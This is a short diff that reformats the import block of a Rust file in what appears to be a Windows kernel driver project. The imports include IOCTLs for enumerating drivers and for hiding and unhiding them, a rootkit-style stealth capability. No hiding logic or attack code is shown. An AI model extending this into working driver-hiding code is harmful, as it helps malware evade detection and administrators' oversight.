@@ -1,5 +1,14 @@
 use {
-    crate::{driver::Driver, handle_driver, utils::ioctls::IoctlHandler}, alloc::boxed::Box, hashbrown::HashMap, shared::{ioctls::{IOCTL_ENUMERATE_DRIVER, IOCTL_HIDE_UNHIDE_DRIVER}, structs::{DriverInfo, TargetDriver}}, wdk_sys::{IO_STACK_LOCATION, IRP, STATUS_SUCCESS}
+    alloc::boxed::Box, 
+    hashbrown::HashMap,
+    wdk_sys::{IO_STACK_LOCATION, IRP, STATUS_SUCCESS},
+    shared::{
+        ioctls::{IOCTL_ENUMERATE_DRIVER, IOCTL_HIDE_UNHIDE_DRIVER}, 
+        structs::{DriverInfo, TargetDriver}
+    }, 
+    crate::{
+        driver::Driver, handle_driver, utils::ioctls::IoctlHandler
+    },
 };
 
 pub fn get_driver_ioctls(ioctls: &mut HashMap<u32, IoctlHandler>) {
